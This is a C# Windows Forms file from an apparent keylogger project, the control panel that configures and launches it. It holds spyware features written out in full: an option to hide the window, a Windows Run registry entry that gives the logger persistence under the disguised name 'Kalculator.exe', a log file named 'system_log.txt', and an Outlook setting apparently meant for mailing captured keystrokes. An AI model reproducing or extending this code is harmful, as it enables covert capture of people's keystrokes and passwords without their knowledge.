using Keylogger.BLL;
using Keylogger.DTO;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Keylogger.GUI
{
    public partial class FormKeylogger : Form
    {
        public FormKeylogger()
        {
            InitializeComponent();

            txtLog.Text = @"E:";
          
            txtNum.Text = "200";
        }

        private void btnRun_Click(object sender, EventArgs e)
        {
            if (cbHiden.Checked) { this.Visible = false; }
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            if (cbStartUp.Checked)
            {
                // Đăng ký stratup cùng Windows
                registryKey.SetValue("Kalculator", Directory.GetCurrentDirectory() + "\\Kalculator.exe");
            }
            else
            {
                // Hủy đăng ký
                registryKey.DeleteValue("Kalculator");
            }

            
            SettingBLL.SetRun(new Setting(txtLog.Text+"\\system_log.txt", Convert.ToInt32(txtNum.Text)), cbOutlook.Checked, txtOutlook.Text);
            SettingBLL.StartKeylogger = true;

            lblRun.Text = "Đã lưu cài đặt!";
        }
        FolderBrowserDialog fl = new FolderBrowserDialog();
        private void btnLog_Click(object sender, EventArgs e)
        {
            fl = new FolderBrowserDialog();
            fl.SelectedPath = "c:";

            if (fl.ShowDialog() == DialogResult.OK)
            {
                txtLog.Text = fl.SelectedPath;
            }
        }

       

        private void btnExit_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void Form2_FormClosing(object sender, FormClosingEventArgs e)
        {
            Application.Exit();
        }
    }
}
